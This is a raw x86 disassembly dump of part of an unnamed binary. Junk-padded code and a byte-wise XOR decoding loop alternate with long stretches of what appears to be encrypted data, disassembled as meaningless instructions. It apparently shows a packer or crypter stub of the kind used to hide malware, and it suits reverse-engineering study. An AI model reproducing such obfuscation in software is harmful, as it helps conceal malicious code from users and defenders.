  40839a:	and    edx,DWORD PTR ds:0x4228ee
  4083a0:	mov    DWORD PTR ds:0x422892,0x217b
  4083aa:	mov    edx,DWORD PTR ds:0x422ae2
  4083b0:	mov    edx,DWORD PTR [edx]
  4083b2:	sub    DWORD PTR ds:0x422956,edx
  4083b8:	add    DWORD PTR ds:0x4228b6,0x6a28
  4083c2:	shr    ecx,0x2
  4083c5:	or     DWORD PTR ds:0x4229c2,0x19bb
  4083cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4083d2:	mov    edx,DWORD PTR [ebp-0x2c]
  4083d5:	xor    eax,edi
  4083d7:	shl    ecx,0x1e
  4083da:	and    ecx,0x262b
  4083e0:	xor    edx,edx
  4083e2:	or     eax,edx
  4083e4:	lea    eax,[ebp+eax*1-0x4]
  4083e8:	sbb    edx,ecx
  4083ea:	mov    DWORD PTR [ebp-0x34],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x30]
  4083f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4083f3:	and    DWORD PTR ds:0x4228b2,ebx
  4083f9:	shrd   eax,ecx,0x2
  4083fd:	mov    edx,DWORD PTR ds:0x42292e
  408403:	sub    DWORD PTR ds:0x4228fa,edx
  408409:	shr    ecx,0x2
  40840c:	or     ecx,ecx
  40840e:	jmp    0x408998
  408413:	xchg   edi,eax
  408414:	xchg   dl,bl
  408416:	(bad)  
  408418:	pop    ecx
  408419:	test   BYTE PTR [eax+0x3e],bl
  40841c:	mov    esi,0xdca1a8d4
  408421:	mov    edx,0x164d4bae
  408426:	push   ss
  408427:	cmp    eax,0x31161604
  40842c:	sbb    bh,BYTE PTR [edi+0x2d]
  40842f:	std    
  408430:	mov    al,BYTE PTR [ecx-0x10]
  408433:	inc    ebp
  408434:	and    eax,0x63bf12f2
  408439:	int    0xc1
  40843b:	mov    edx,0xa33a3f55
  408440:	call   0x7854eab9
  408445:	addr16 push eax
  408447:	push   edx
  408448:	pop    edi
  408449:	mov    ebx,0xf3653143
  40844e:	xlat   BYTE PTR ds:[ebx]
  40844f:	sbb    eax,0xf7031b32
  408454:	jmp    0xa9d5723c
  408459:	in     al,dx
  40845a:	jp     0x40844a
  40845c:	jecxz  0x408438
  40845e:	mov    bh,BYTE PTR [ecx-0x7eb3b6e8]
  408464:	xor    BYTE PTR ds:0x11b018b9,ch
  40846a:	ret    0xcf7e
  40846d:	ret    
  40846e:	jne    0x4084da
  408470:	pop    ds
  408471:	xlat   BYTE PTR ds:[ebx]
  408472:	jo     0x1d96c58f
  408478:	lea    bx,ds:0x11f0511d
  40847f:	scas   eax,DWORD PTR es:[edi]
  408480:	leave  
  408481:	outs   dx,DWORD PTR ds:[esi]
  408482:	loopne 0x408480
  408484:	in     al,dx
  408485:	es dec edx
  408487:	cmp    DWORD PTR [ebp+0x1ac55e89],ebx
  40848d:	popf   
  40848e:	stos   DWORD PTR es:[edi],eax
  40848f:	imul   edx,esp,0xb36c163b
  408495:	punpckhdq mm3,QWORD PTR [edx-0x46]
  408499:	or     edi,DWORD PTR [esi]
  40849b:	mov    esi,ebx
  40849d:	pop    eax
  40849e:	std    
  40849f:	test   edi,ecx
  4084a1:	shr    BYTE PTR [ebp+eiz*8+0x19eb9b73],0xe0
  4084a9:	pop    es
  4084aa:	xor    eax,esp
  4084ac:	pop    esi
  4084ad:	xor    ah,BYTE PTR [edi-0x1216bb36]
  4084b3:	jo     0x40848d
  4084b5:	sbb    BYTE PTR [edx],dh
  4084b7:	ja     0x4084a6
  4084b9:	jbe    0x40845f
  4084bb:	pop    ds
  4084bc:	jo     0x4084c0
  4084be:	stc    
  4084bf:	mov    bl,0x11
  4084c1:	cmp    esp,DWORD PTR [ebp-0x1ea042]
  4084c7:	arpl   si,sp
  4084c9:	enter  0x69c1,0xe4
  4084cd:	paddsw mm4,QWORD PTR [eax+0x60707699]
  4084d4:	xor    bl,BYTE PTR [ebx+esi*1-0x10]
  4084d8:	push   ebp
  4084d9:	fdivp  st(7),st
  4084db:	sahf   
  4084dc:	jmp    0x4084c9
  4084de:	mov    cl,0xb5
  4084e0:	loop   0x4084a2
  4084e2:	popa   
  4084e3:	jmp    0xcc0ae9a7
  4084e8:	push   es
  4084e9:	xchg   BYTE PTR [esi+edx*4+0x5f7d8d96],dh
  4084f0:	xchg   ebp,eax
  4084f2:	(bad)  
  4084f3:	fwait
  4084f4:	sbb    esp,esi
  4084f6:	cli    
  4084f7:	call   0xed8f6673
  4084fc:	cmp    al,0xc2
  4084fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ff:	push   ss
  408500:	jmp    esp
  408502:	push   cs
  408503:	in     eax,0x12
  408505:	and    ebp,edi
  408507:	xchg   BYTE PTR ds:0xf4a8fc36,ah
  40850d:	enter  0x1ce0,0xcd
  408511:	fld    DWORD PTR [esi-0x7e]
  408514:	cli    
  408515:	cmc    
  408516:	stos   BYTE PTR es:[edi],al
  408517:	lds    ecx,FWORD PTR [ecx+0x58]
  40851a:	scas   eax,DWORD PTR es:[edi]
  40851b:	cmp    DWORD PTR [ebx],ebp
  40851d:	jl     0x408573
  40851f:	jno    0x4084bb
  408521:	xor    ah,al
  408523:	or     eax,0x7cd34549
  408528:	fistp  QWORD PTR [ebx-0x7a]
  40852b:	push   ebp
  40852c:	loop   0x408594
  40852e:	iret   
  40852f:	stos   DWORD PTR es:[edi],eax
  408530:	cmp    eax,DWORD PTR [ebp+0x7d]
  408533:	dec    ebx
  408534:	add    cl,BYTE PTR [edi-0x6b]
  408537:	aad    0x93
  408539:	mov    al,0x5c
  40853b:	or     BYTE PTR [eax+0x46],0xbf
  40853f:	psubusb mm0,QWORD PTR [esi-0x42b47028]
  408546:	lds    edx,FWORD PTR [eax-0xd039ec6]
  40854c:	xor    BYTE PTR [ecx+esi*2],cl
  40854f:	mov    bh,0x24
  408551:	stc    
  408552:	stc    
  408553:	sub    edi,DWORD PTR [eax+0x291f3fee]
  408559:	and    al,0xb9
  40855b:	adc    esi,DWORD PTR [eax]
  40855d:	dec    BYTE PTR [eax+0x334629af]
  408563:	jbe    0x408528
  408565:	mov    ebx,eax
  408567:	inc    ebx
  408568:	xchg   ebp,eax
  408569:	cmp    ecx,edi
  40856b:	nop
  40856c:	or     al,0x9e
  40856e:	pop    ecx
  40856f:	inc    edx
  408570:	jne    0x4085a7
  408572:	push   0xd2da387
  408577:	je     0x4085f4
  408579:	popf   
  40857a:	dec    edi
  40857b:	ins    DWORD PTR es:[edi],dx
  40857c:	imul   ebp,DWORD PTR [ecx],0xfffffffc
  40857f:	jbe    0x4085cf
  408581:	cmp    eax,0x910c887c
  408586:	add    edx,0x88db48af
  40858c:	mov    edx,0x15aa1dc5
  408591:	pop    edi
  408592:	out    0x10,eax
  408594:	cmp    ah,al
  408596:	add    eax,0x82bff4f2
  40859b:	ret    
  40859c:	jns    0x40857c
  40859e:	shl    DWORD PTR [eax+0x6e147a59],0x81
  4085a5:	mov    WORD PTR [ecx],gs
  4085a7:	mov    esp,0x904dffa1
  4085ac:	cmp    BYTE PTR [ebp-0x67397c2c],0x99
  4085b3:	sub    esi,ecx
  4085b5:	dec    ebp
  4085b6:	repz retf 0x18c3
  4085ba:	add    ebx,esi
  4085bc:	sbb    al,0x2
  4085be:	cmp    al,0x5
  4085c0:	lds    ebp,FWORD PTR [edx+0x71918210]
  4085c6:	stos   DWORD PTR es:[edi],eax
  4085c7:	adc    bh,BYTE PTR [edi+0x17]
  4085ca:	mov    ds:0x8d200746,eax
  4085cf:	add    ebx,esi
  4085d1:	pop    ebp
  4085d2:	mov    ch,0x80
  4085d4:	cmp    al,bh
  4085d6:	sbb    al,0x8e
  4085d8:	jge    0x4085fa
  4085da:	dec    ecx
  4085db:	rol    DWORD PTR cs:[ecx+0x3eb9dcff],cl
  4085e2:	sbb    al,0xe1
  4085e4:	pop    ds
  4085e5:	pop    ebx
  4085e6:	(bad)  
  4085e7:	setb   ch
  4085ea:	pusha  
  4085eb:	icebp  
  4085ec:	jmp    0xab26:0x5c61708a
  4085f3:	pop    ebp
  4085f4:	xchg   ebx,eax
  4085f5:	idiv   DWORD PTR [edi-0x36]
  4085f8:	inc    edi
  4085f9:	lods   eax,DWORD PTR ds:[esi]
  4085fa:	(bad)  
  4085fc:	inc    eax
  4085fd:	mov    esi,0x37254868
  408602:	imul   ecx,eax,0x296e42b
  408608:	ret    0xbfda
  40860b:	dec    ecx
  40860c:	dec    ecx
  40860d:	xchg   edx,eax
  40860e:	enter  0x5ec9,0xe
  408612:	sub    BYTE PTR [esi-0x5f5ab6cb],0x48
  408619:	lea    ebp,ds:0xe2def732
  40861f:	and    eax,0x37fea568
  408624:	lods   al,BYTE PTR ds:[esi]
  408625:	xchg   ebx,eax
  408626:	inc    ecx
  408627:	cwde   
  408628:	cmp    al,0x23
  40862a:	sbb    bl,BYTE PTR [edx+0x4b3d93e3]
  408630:	push   cs
  408631:	push   cs
  408632:	aad    0x6e
  408634:	pusha  
  408635:	lds    ebp,FWORD PTR [ecx]
  408637:	xor    eax,0x5939fe7
  40863c:	sbb    eax,0xdab9025f
  408641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408642:	inc    esi
  408643:	call   FWORD PTR [ebp-0x539c9e9f]
  408649:	sbb    ebp,esi
  40864b:	adc    eax,0xdb04db88
  408650:	rcl    BYTE PTR [ebp-0x62],cl
  408653:	jne    0x408640
  408655:	dec    ecx
  408656:	sbb    esi,DWORD PTR [ebp+0x66]
  408659:	xor    DWORD PTR [edi],ebx
  40865b:	jne    0x4085f1
  40865d:	mov    bh,BYTE PTR [ecx]
  40865f:	add    DWORD PTR [edi+0x33d18422],ebx
  408665:	cwde   
  408666:	int3   
  408667:	cli    
  408668:	mov    ecx,0xec8aee05
  40866d:	rol    DWORD PTR [ebx-0x2010ccd],0x1d
  408674:	lock ret 
  408676:	xor    DWORD PTR [esi+0x56],ecx
  408679:	out    dx,eax
  40867a:	bound  esp,QWORD PTR [edx+0x43]
  40867d:	sub    edi,esi
  40867f:	imul   eax,DWORD PTR [edi-0x486075c9],0x20
  408686:	(bad)  
  408687:	repnz (bad) 
  408689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40868a:	mov    esp,0x7ad047d5
  40868f:	dec    eax
  408690:	out    0xf7,eax
  408692:	pop    esp
  408693:	out    0x8f,eax
  408695:	je     0x408704
  408697:	mov    al,0x36
  408699:	pusha  
  40869a:	push   ss
  40869b:	adc    ch,ah
  40869d:	jp     0x40869f
  40869f:	repnz sbb eax,DWORD PTR [ebx]
  4086a2:	sbb    al,0x18
  4086a4:	imul   edx,edx,0x1f
  4086a7:	loopne 0x4086a5
  4086a9:	enter  0xbde,0x38
  4086ad:	pop    ecx
  4086ae:	pop    edi
  4086af:	fsub   DWORD PTR [edx+0x6b]
  4086b2:	test   eax,0x1b2dd9b7
  4086b7:	or     DWORD PTR [edi-0x54],esi
  4086ba:	cmp    al,0x34
  4086bc:	push   esp
  4086bd:	lds    eax,FWORD PTR [edi]
  4086bf:	sub    BYTE PTR [esi+esi*2],bh
  4086c2:	jo     0x4086e0
  4086c4:	xor    DWORD PTR [ebx],esp
  4086c6:	dec    esi
  4086c7:	pop    ebx
  4086c8:	add    eax,esp
  4086ca:	scas   eax,DWORD PTR es:[edi]
  4086cb:	mov    BYTE PTR [ecx-0x20],cl
  4086ce:	inc    eax
  4086cf:	test   eax,0x411e7efe
  4086d4:	push   eax
  4086d5:	iret   
  4086d6:	bsf    ebp,DWORD PTR [ebx-0x44aec4c9]
  4086dd:	or     esp,ebx
  4086df:	push   ebp
  4086e0:	mov    edi,0x37254d12
  4086e5:	jae    0x40872b
  4086e7:	and    dl,bh
  4086e9:	(bad)  
  4086ea:	jns    0x4086a8
  4086ec:	dec    ebx
  4086ed:	loope  0x408692
  4086ef:	fsub   QWORD PTR [ebx]
  4086f1:	rol    BYTE PTR [eax+0x6b],0xa4
  4086f5:	fs data16 mov dl,0x19
  4086f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086fa:	imul   ebp,esi,0x7a
  4086fd:	(bad)  
  4086fe:	bound  ebp,QWORD PTR [ebp+eiz*8-0x5b2492ba]
  408705:	stos   BYTE PTR es:[edi],al
  408706:	dec    esp
  408707:	sbb    eax,0x82305f6f
  40870c:	mov    al,0x53
  40870e:	frstor [esi-0x5fea683]
  408714:	dec    edx
  408715:	sti    
  408716:	inc    edi
  408717:	js     0x4086e1
  408719:	call   FWORD PTR [esi+0x5de459d3]
  40871f:	repnz loope 0x4086b2
  408722:	cmp    DWORD PTR [ecx+0x649cbe98],ebx
  408728:	mov    ebp,0x25aae080
  40872d:	xor    BYTE PTR [eax-0x75],cl
  408730:	mov    esi,0x58fce982
  408735:	jo     0x4086d2
  408737:	leave  
  408738:	push   cs
  408739:	push   eax
  40873a:	aad    0x82
  40873c:	or     BYTE PTR [esi+0x68],0xd
  408740:	xchg   ecx,eax
  408741:	and    DWORD PTR [edi-0x1d7e3ed4],esi
  408747:	sahf   
  408748:	push   eax
  408749:	outs   dx,DWORD PTR ds:[esi]
  40874a:	lods   al,BYTE PTR ds:[esi]
  40874b:	jns    0x408791
  40874d:	mov    eax,0x369a1423
  408752:	and    ch,BYTE PTR [edi-0x149d7f16]
  408758:	hlt    
  408759:	mov    al,ds:0xf3170853
  40875e:	pop    esp
  40875f:	out    0xd1,al
  408761:	pop    eax
  408762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408763:	sub    esp,edi
  408765:	imul   ebp,DWORD PTR ds:[eax+0x6bee4b5a],0xffffff9e
  40876d:	pop    ecx
  40876e:	inc    edx
  40876f:	jno    0x408743
  408771:	sub    DWORD PTR [ebx-0x58],edi
  408774:	int3   
  408775:	or     DWORD PTR [ebp-0x25545663],edi
  40877b:	test   al,0xe4
  40877d:	cmc    
  40877e:	pop    eax
  40877f:	nop
  408780:	into   
  408781:	in     al,dx
  408782:	nop
  408783:	leave  
  408784:	cdq    
  408785:	cli    
  408786:	push   ss
  408787:	fldenv [ebp-0x68e42ca]
  40878d:	pop    ecx
  40878e:	jp     0x4087ab
  408790:	in     eax,0xf6
  408792:	push   0x2b
  408794:	inc    eax
  408795:	sub    ebx,DWORD PTR cs:[edi]
  408798:	mov    edx,0xb1bf7bea
  40879d:	xor    BYTE PTR [edx-0x830a179],0x24
  4087a4:	add    DWORD PTR [eax],ebp
  4087a6:	into   
  4087a7:	pop    es
  4087a8:	je     0x408760
  4087aa:	add    eax,0x8b23894e
  4087af:	or     eax,0x2b1acc9d
  4087b4:	inc    eax
  4087b5:	pop    ds
  4087b6:	pop    ebx
  4087b7:	xchg   ebp,eax
  4087b8:	xchg   edi,eax
  4087b9:	(bad)  
  4087ba:	outs   dx,DWORD PTR ds:[esi]
  4087bb:	je     0x40876e
  4087bd:	retf   
  4087be:	xor    al,0x66
  4087c0:	xor    ebp,DWORD PTR [ebp+esi*4+0x3f]
  4087c4:	or     BYTE PTR [ecx],cl
  4087c6:	sub    BYTE PTR [ebp-0x159eadf7],bh
  4087cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087cd:	jae    0x40880a
  4087cf:	shl    eax,1
  4087d1:	add    ebp,DWORD PTR [eax+0x3dc8f34b]
  4087d7:	xchg   ecx,eax
  4087d8:	cmp    BYTE PTR ds:[eax-0x75],0x5f
  4087dd:	fadd   st,st(0)
  4087df:	xor    al,0x33
  4087e1:	inc    ebp
  4087e2:	pop    edx
  4087e3:	add    eax,0x5df74085
  4087e8:	pop    ebp
  4087e9:	sub    BYTE PTR [edi],ah
  4087eb:	and    cl,0x3
  4087ee:	fcomp  QWORD PTR [esi+0x21]
  4087f1:	popf   
  4087f2:	sti    
  4087f3:	test   al,0xf4
  4087f5:	ins    DWORD PTR es:[edi],dx
  4087f6:	pop    esp
  4087f7:	addr16 mov edi,0xe201effb
  4087fd:	or     ah,dh
  4087ff:	in     al,0x31
  408801:	repz das 
  408803:	iret   
  408804:	int    0xcb
  408806:	pop    DWORD PTR [esp+eax*8-0x3c49e817]
  40880d:	and    DWORD PTR [ebx-0x4a62335d],ecx
  408813:	cdq    
  408814:	jne    0x408858
  408816:	jae    0x4087f1
  408818:	call   0xb67b:0x7c1c57fe
  40881f:	xchg   ebp,eax
  408820:	int    0x74
  408822:	mov    ecx,0xd7188da1
  408827:	mul    BYTE PTR [edx-0x2c]
  40882a:	cs add eax,0xf5223be5
  408830:	into   
  408831:	cdq    
  408832:	in     eax,dx
  408833:	mov    DWORD PTR [esi+0x50cc5fd9],eax
  408839:	inc    eax
  40883a:	popa   
  40883b:	adc    BYTE PTR [edx+0x369ea2f8],cl
  408841:	leave  
  408842:	cmp    ebx,DWORD PTR [edi]
  408844:	mov    al,ds:0xf69a5fdd
  408849:	mov    BYTE PTR [ecx],bl
  40884b:	inc    edi
  40884c:	mov    ecx,0xae058f76
  408851:	xor    esi,ecx
  408853:	and    ebx,DWORD PTR [esi+0x7802f63b]
  408859:	sub    edi,DWORD PTR [edi+0x93b29ac]
  40885f:	sti    
  408860:	repz inc esi
  408862:	cdq    
  408863:	jnp    0x4088c6
  408865:	inc    edx
  408866:	ret    0xbdbb
  408869:	cmp    eax,0x3f0f3ad3
  40886e:	cld    
  40886f:	sahf   
  408870:	ins    DWORD PTR es:[edi],dx
  408871:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408873:	adc    ebp,DWORD PTR [ebx]
  408875:	sub    ah,0x67
  408878:	mov    eax,0xf518005b
  40887d:	pushf  
  40887e:	sar    BYTE PTR [eax],cl
  408880:	pop    ds
  408881:	push   esp
  408882:	ins    DWORD PTR es:[edi],dx
  408883:	adc    BYTE PTR [ebx+ecx*4],al
  408886:	imul   ecx,DWORD PTR [ebx-0x11],0x583e9e8
  40888d:	test   dl,dh
  40888f:	rol    DWORD PTR [eax],0x13
  408892:	sbb    ecx,DWORD PTR [ebx+0x5ed56e81]
  408898:	dec    ebx
  408899:	mov    ch,0x1c
  40889b:	in     al,dx
  40889c:	not    BYTE PTR [ecx+0x1c]
  40889f:	pop    ebx
  4088a0:	jns    0x40890c
  4088a2:	and    DWORD PTR [edx+0x68ebe099],esi
  4088a8:	es cdq 
  4088aa:	mov    ebp,0x79b3e3f6
  4088af:	xor    eax,0x138437fa
  4088b4:	cmp    al,0xa1
  4088b6:	sbb    esi,ecx
  4088b8:	inc    ecx
  4088b9:	out    dx,eax
  4088ba:	shl    DWORD PTR [esi-0x62b29e45],0x74
  4088c1:	jbe    0x4088d7
  4088c3:	fs in  al,0x62
  4088c6:	not    BYTE PTR [esi-0x4a23496f]
  4088cc:	iret   
  4088cd:	inc    eax
  4088ce:	pusha  
  4088cf:	popf   
  4088d0:	test   DWORD PTR [edi+0x29575cd],0x119ddd63
  4088da:	test   eax,0x6d007986
  4088df:	(bad)  
  4088e0:	or     eax,0x86eb1d74
  4088e5:	stos   BYTE PTR es:[edi],al
  4088e6:	pop    esi
  4088e7:	or     eax,0x8175a51f
  4088ec:	enter  0x76d4,0xf8
  4088f0:	xor    esp,DWORD PTR [ecx-0x5c5e96bb]
  4088f6:	clc    
  4088f7:	inc    esi
  4088f8:	dec    edx
  4088f9:	stos   BYTE PTR es:[edi],al
  4088fa:	aad    0x3
  4088fc:	mov    al,0xd3
  4088fe:	sbb    DWORD PTR [ebp-0x77bdb0ee],edx
  408904:	outs   dx,BYTE PTR ds:[esi]
  408905:	or     DWORD PTR [eax],eax
  408907:	sub    ebp,DWORD PTR [ebx-0x23a1986a]
  40890d:	pushf  
  40890e:	xor    dh,al
  408910:	mov    dh,0x3
  408912:	cmp    ebx,edi
  408914:	(bad)  
  408915:	test   eax,0x5dd9d74c
  40891a:	mov    ds,WORD PTR [ecx]
  40891c:	adc    ebp,ebp
  40891e:	les    ecx,FWORD PTR ds:0xadba23e4
  408924:	test   DWORD PTR [esi],0x8504b08e
  40892a:	arpl   WORD PTR [ecx+0x6b],bp
  40892d:	das    
  40892e:	jb     0x408910
  408930:	sub    ah,BYTE PTR [edi+0x72]
  408933:	xchg   ebp,eax
  408934:	adc    al,0xc1
  408936:	xchg   esp,eax
  408937:	je     0x4088f9
  408939:	inc    eax
  40893a:	adc    dl,cl
  40893c:	or     DWORD PTR [ebx+ebp*2+0x3def2c7],eax
  408943:	xor    ch,ah
  408945:	out    dx,eax
  408946:	shl    DWORD PTR [ebx],1
  408948:	mov    cs,esp
  40894a:	ss xchg edx,eax
  40894c:	mov    ?,edx
  40894e:	lahf   
  40894f:	dec    edi
  408950:	scas   al,BYTE PTR es:[edi]
  408951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408952:	sahf   
  408953:	inc    esp
  408954:	and    ch,BYTE PTR [ecx]
  408956:	xchg   esi,eax
  408957:	stos   DWORD PTR es:[edi],eax
  408958:	std    
  408959:	imul   esp,DWORD PTR [ebx-0x43eef465],0xa0240d2c
  408963:	test   al,0xbc
  408965:	mov    bh,0xfe
  408967:	aas    
  408968:	cmp    BYTE PTR [ebx],al
  40896a:	or     al,0x13
  40896c:	sub    cl,bh
  40896e:	add    ah,dh
  408970:	imul   esi,DWORD PTR [ecx-0x46b3036a],0x1b3487e0
  40897a:	addr16 repnz in al,0xc3
  40897e:	cmp    al,0xb
  408980:	dec    BYTE PTR gs:[ebx+esi*1-0x48]
  408985:	pop    esi
  408986:	push   cs
  408987:	sub    al,bl
  408989:	cdq    
  40898a:	jge    0x408915
  40898c:	test   DWORD PTR [ecx],edi
  40898e:	mov    ah,BYTE PTR [esi]
  408990:	push   esp
  408991:	or     eax,0xfe7f8c16
  408996:	test   al,0x85
  408998:	mov    ecx,DWORD PTR [ebp-0x30]
  40899b:	mov    edx,DWORD PTR [ebp-0x2c]
  40899e:	adc    DWORD PTR ds:0x42294a,0x1fff
  4089a8:	shl    ecx,0x1e
  4089ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4089ae:	xor    eax,edi
  4089b0:	xor    edx,edx
  4089b2:	sbb    DWORD PTR ds:0x4228c2,0x5606
  4089bc:	or     eax,edx
  4089be:	mov    cl,BYTE PTR [eax+ecx*1]
  4089c1:	mov    eax,DWORD PTR [ebp-0x34]
  4089c4:	or     edx,DWORD PTR ds:0x42290e
  4089ca:	xor    BYTE PTR [eax],cl
  4089cc:	mov    eax,DWORD PTR [ebp-0x20]
  4089cf:	sub    DWORD PTR ds:0x422932,0x6c12
  4089d9:	jmp    0x408f63
  4089de:	in     eax,dx
  4089df:	imul   ebx,eax,0x7d
  4089e2:	pop    eax
  4089e3:	je     0x408a4d
  4089e5:	pop    edx
  4089e6:	mov    ds:0xc972b232,eax
  4089eb:	push   es
  4089ec:	and    BYTE PTR [eax+eax*4+0x43],dh
  4089f0:	push   ss
  4089f1:	push   ss
  4089f2:	cmp    eax,0xa161604
  4089f7:	xchg   edx,eax
  4089f8:	cli    
  4089f9:	out    dx,eax
  4089fa:	xchg   ebx,eax
  4089fb:	cmp    BYTE PTR [ebx+0x67],al
  4089fe:	aad    0x31
  408a00:	pop    eax
  408a01:	lods   eax,DWORD PTR ds:[esi]
  408a02:	ror    BYTE PTR [ecx-0x4c504b6a],1
  408a08:	pusha  
  408a09:	xchg   edx,eax
  408a0a:	add    BYTE PTR [edx],0x8f
  408a0d:	arpl   si,cx
  408a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a10:	scas   al,BYTE PTR es:[edi]
  408a11:	fidiv  WORD PTR [ecx]
  408a13:	or     eax,0x9c9a10ae
  408a18:	(bad)  
  408a19:	test   BYTE PTR [ebp+0x6d],dl
  408a1c:	dec    ebx
  408a1d:	pop    ebp
  408a1e:	inc    esi
  408a1f:	inc    ebx
  408a20:	mov    DWORD PTR [ecx],ebx
  408a22:	cmp    bh,BYTE PTR [eax]
  408a24:	mov    eax,ds:0x869104bb
  408a29:	cwde   
  408a2a:	jg     0x408a31
  408a2c:	cmp    al,0xa
  408a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2f:	sti    
  408a30:	clc    
  408a31:	push   es
  408a32:	cmp    eax,0xa773d745
  408a37:	popa   
  408a38:	mov    edx,0xdbe2b540
  408a3d:	inc    edx
  408a3e:	icebp  
  408a3f:	outs   dx,DWORD PTR ds:[esi]
  408a40:	rcl    BYTE PTR [edx],cl
  408a42:	out    0x55,eax
  408a44:	lds    ebx,FWORD PTR [esi]
  408a46:	fistp  DWORD PTR [edx+edi*1]
  408a49:	adc    ebp,esp
  408a4b:	retf   
  408a4c:	cli    
  408a4d:	push   es
  408a4e:	push   ebp
  408a4f:	mov    BYTE PTR [esi],dl
  408a51:	loop   0x408abd
  408a53:	cmc    
  408a54:	out    0xa2,eax
  408a56:	xor    al,0x70
  408a58:	mov    ebx,0xe5bd37a8
  408a5d:	clc    
  408a5e:	pop    eax
  408a5f:	mov    eax,ds:0x234f5059
  408a64:	dec    BYTE PTR [eax+edi*4+0x5b7df47]
  408a6b:	or     eax,0x336e9611
  408a70:	push   es
  408a71:	jp     0x408a96
  408a73:	inc    ebp
  408a74:	push   es
  408a75:	popa   
  408a76:	pop    esp
  408a77:	or     BYTE PTR [edi-0x41b1c84c],0xe9
  408a7e:	push   0x11f8f11d
  408a83:	retf   
  408a84:	sbb    ch,BYTE PTR [esi]
  408a86:	iret   
  408a87:	push   es
  408a88:	xor    al,0xff
  408a8a:	jmp    0x2faa44cb
  408a8f:	sub    ecx,DWORD PTR ds:0xd0d91221
  408a95:	loopne 0x408a85
  408a97:	mov    es,WORD PTR [esi-0x6f]
  408a9a:	ja     0x408acf
  408a9c:	cmp    al,0x28
  408a9e:	cmp    DWORD PTR [ebx-0x58],0xdff4cf65
  408aa5:	pop    DWORD PTR [edx]
  408aa7:	not    DWORD PTR [ebx]
  408aa9:	in     eax,dx
  408aaa:	sub    bl,dh
  408aac:	add    eax,0x187cb886
  408ab1:	sbb    al,0xe8
  408ab3:	mov    bl,0xc2
  408ab5:	das    
  408ab6:	jne    0x408b28
  408ab8:	lods   al,BYTE PTR ds:[esi]
  408ab9:	ins    BYTE PTR es:[edi],dx
  408aba:	ds call 0x455256c2
  408ac0:	das    
  408ac1:	pop    esi
  408ac2:	jae    0x408afe
  408ac4:	jno    0x408ae3
  408ac6:	add    al,0xd
  408ac8:	sti    
  408ac9:	mov    edx,0x4f445e21
  408ace:	stc    
  408acf:	lock lods al,BYTE PTR ds:[esi]
  408ad1:	cdq    
  408ad2:	cmp    BYTE PTR [edi-0x95896a],0xb0
  408ad9:	ret    0x3093
  408adc:	test   eax,0x2b73294e
  408ae1:	inc    ebp
  408ae2:	add    dh,ch
  408ae4:	ficom  DWORD PTR [edi+0x53702db6]
  408aea:	sbb    BYTE PTR [eax+ecx*8-0x13],0x64
  408aef:	das    
  408af0:	and    al,0x56
  408af2:	rcr    DWORD PTR [ecx-0x51a2ef7c],cl
  408af8:	push   0xbbea8a4c
  408afd:	push   ebx
  408afe:	call   0x4b99:0xae328cf7
  408b05:	cmp    dl,ah
  408b07:	gs jg  0x408a97
  408b0a:	popa   
  408b0b:	sbb    edx,DWORD PTR [ecx+0x2146742e]
  408b11:	fmul   QWORD PTR [edx+0xf]
  408b14:	xor    BYTE PTR [esi+eax*2+0x56b11fa5],ch
  408b1b:	xor    esi,DWORD PTR [ebx+ebx*1-0xc]
  408b1f:	fs ins BYTE PTR es:[edi],dx
  408b21:	fsubr  DWORD PTR [ecx+0x1]
  408b24:	adc    al,0x54
  408b26:	mov    dh,0x35
  408b28:	aas    
  408b29:	jecxz  0x408b4a
  408b2b:	dec    ebx
  408b2c:	ret    0x291a
  408b2f:	popf   
  408b30:	stos   DWORD PTR es:[edi],eax
  408b31:	adc    DWORD PTR [edx],edi
  408b33:	sbb    dl,BYTE PTR [ebp-0x4ad54228]
  408b39:	leave  
  408b3a:	xor    ecx,DWORD PTR [ebp+0x7fbd4e9b]
  408b40:	or     eax,DWORD PTR [eax-0x54]
  408b43:	jb     0x408b12
  408b45:	sti    
  408b46:	add    ch,dl
  408b48:	std    
  408b49:	and    DWORD PTR [ebx+esi*1+0x2483ec36],edx
  408b50:	dec    ebp
  408b51:	jmp    0x408b25
  408b53:	jle    0x408aff
  408b55:	jo     0x408b82
  408b57:	scas   al,BYTE PTR es:[edi]
  408b58:	mov    DWORD PTR [ebx-0x7572531a],ecx
  408b5e:	aad    0x1a
  408b60:	inc    eax
  408b61:	xchg   esi,eax
  408b62:	addr16 pop edx
  408b64:	mov    eax,ds:0xa09479b5
  408b69:	jmp    0xb985da7a
  408b6e:	aaa    
  408b6f:	inc    edx
  408b70:	push   ecx
  408b71:	push   esi
  408b72:	imul   BYTE PTR [ebp+0x5036fc63]
  408b78:	or     al,0x4d
  408b7a:	mov    edi,0x9cd29cd7
  408b7f:	int3   
  408b80:	lea    eax,[edx-0xa]
  408b83:	fnsave [edi]
  408b85:	inc    ebx
  408b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b87:	dec    esi
  408b88:	fmul   DWORD PTR [ecx+eiz*4-0x14]
  408b8c:	imul   ecx,DWORD PTR [ebx-0x62cb9fe6],0xffffffed
  408b93:	lock pop ecx
  408b95:	xchg   ebp,eax
  408b96:	rcr    BYTE PTR [ebp+0x20],0x24
  408b9a:	mov    cl,0x6d
  408b9c:	ret    
  408b9d:	jl     0x408b33
  408b9f:	fcmovu st,st(1)
  408ba1:	ins    BYTE PTR es:[edi],dx
  408ba2:	jae    0x408b40
  408ba4:	sub    cl,BYTE PTR [eax+ebp*8+0x4]
  408ba8:	sub    DWORD PTR [esi],ebp
  408baa:	jg     0x408c0e
  408bac:	or     ah,cl
  408bae:	pushf  
  408baf:	adc    ebp,DWORD PTR [esi+0x4765e0e7]
